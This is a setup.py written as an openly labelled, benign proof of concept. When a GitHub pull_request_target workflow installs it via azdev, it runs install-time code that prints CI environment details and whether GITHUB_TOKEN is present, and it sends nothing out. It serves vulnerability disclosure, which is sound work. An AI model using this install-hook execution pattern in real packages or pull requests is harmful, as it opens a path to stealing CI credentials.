from setuptools import setup, find_packages
import os
import sys

# === SECURITY RESEARCH PoC ===
# This code demonstrates arbitrary code execution via azdev extension add
# in the VersionCalPRComment.yml workflow (pull_request_target trigger).
# This is a benign proof-of-concept - no secrets are exfiltrated.
print("=" * 70)
print("[SECURITY_RESEARCH_POC] Arbitrary code execution via setup.py")
print("[SECURITY_RESEARCH_POC] This proves setup.py runs during azdev extension add")
print(f"[SECURITY_RESEARCH_POC] RUNNER_OS = {os.environ.get('RUNNER_OS', 'N/A')}")
print(f"[SECURITY_RESEARCH_POC] GITHUB_REPOSITORY = {os.environ.get('GITHUB_REPOSITORY', 'N/A')}")
print(f"[SECURITY_RESEARCH_POC] GITHUB_ACTOR = {os.environ.get('GITHUB_ACTOR', 'N/A')}")
print(f"[SECURITY_RESEARCH_POC] GITHUB_EVENT_NAME = {os.environ.get('GITHUB_EVENT_NAME', 'N/A')}")
print(f"[SECURITY_RESEARCH_POC] GITHUB_TOKEN present = {'GITHUB_TOKEN' in os.environ}")
print(f"[SECURITY_RESEARCH_POC] Python executable = {sys.executable}")
print(f"[SECURITY_RESEARCH_POC] CWD = {os.getcwd()}")
print("=" * 70)

setup(
    name='poc-security-test',
    version='0.1.0',
    description='Security Research PoC - Benign',
    long_description='This is a security research proof of concept.',
    license='MIT',
    author='Security Research',
    author_email='security@example.com',
    url='https://github.com/Azure/azure-cli-extensions',
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_poc_security_test': []},
)
